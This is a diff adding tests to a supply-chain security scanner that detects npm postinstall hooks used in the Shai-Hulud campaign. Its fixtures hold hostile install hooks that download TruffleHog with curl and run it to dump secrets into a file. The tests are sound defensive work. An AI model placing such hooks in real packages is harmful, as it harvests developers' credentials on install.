@@ -391,3 +391,64 @@ class TestNpmLifecyclePlugin:
         assert len(findings) >= 2
         assert any("file1.js" in str(f.file_path) for f in findings)
         assert any("file2.js" in str(f.file_path) for f in findings)
+
+
+class TestShaHuludPatterns:
+    """Test detection of Shai-Hulud campaign patterns."""
+
+    def test_trufflehog_download(self, tmp_path):
+        """Test NPM-008: TruffleHog binary download."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "evil-scanner",
+            "scripts": {
+                "postinstall": "curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog_linux -o trufflehog"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-008" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_trufflehog_execution(self, tmp_path):
+        """Test NPM-009: TruffleHog execution."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "evil-scanner",
+            "scripts": {
+                "postinstall": "chmod +x trufflehog && ./trufflehog filesystem . --json > secrets.json"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-009" for f in findings)
+
+    def test_legitimate_trufflehog_reference(self, tmp_path):
+        """Test that README mentions of TruffleHog don't trigger."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "security-docs",
+            "scripts": {
+                "test": "npm test"
+            }
+        }))
+
+        readme = tmp_path / "README.md"
+        readme.write_text("""
+        # Security Tools
+
+        This project uses TruffleHog for secret scanning in CI/CD.
+        See https://github.com/trufflesecurity/trufflehog
+        """)
+
+        findings = plugin.scan(tmp_path)
+        # Should NOT trigger on README content (only scans package.json and .js files)
+        critical_findings = [f for f in findings if f.severity.value == "critical"]
+        assert len(critical_findings) == 0
